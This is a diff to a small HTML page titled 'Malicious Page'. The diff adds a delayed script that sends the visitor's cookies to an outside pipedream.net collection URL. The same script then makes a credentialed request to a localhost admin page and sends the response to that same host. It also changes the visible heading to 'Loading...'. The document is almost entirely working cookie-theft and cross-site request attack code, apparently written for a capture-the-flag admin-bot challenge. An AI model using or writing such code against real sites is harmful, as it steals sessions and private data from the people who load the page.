@@ -2,8 +2,30 @@
 <html>
 <head>
     <title>Malicious Page</title>
+    <script>
+        setTimeout(function() {
+            // Send the admin's cookies using XMLHttpRequest
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://eof6994z5mxf31q.m.pipedream.net?cookie=' + document.cookie, true);
+            xhr.send();
+
+            // Perform a CSRF attack to retrieve sensitive data
+            var xhr2 = new XMLHttpRequest();
+            xhr2.open('GET', 'http://localhost/admin.php', true);
+            xhr2.withCredentials = true; // Include cookies
+            xhr2.onreadystatechange = function() {
+                if (xhr2.readyState === 4 && xhr2.status === 200) {
+                    // Send the data to your RequestBin
+                    var xhr3 = new XMLHttpRequest();
+                    xhr3.open('GET', 'https://eof6994z5mxf31q.m.pipedream.net?data=' + encodeURIComponent(xhr2.responseText), true);
+                    xhr3.send();
+                }
+            };
+            xhr2.send();
+        }, 2000); // Wait 2 seconds before executing
+    </script>
 </head>
 <body>
-    <h1>Hello World!</h1>
+    <h1>Loading...</h1>
 </body>
 </html>
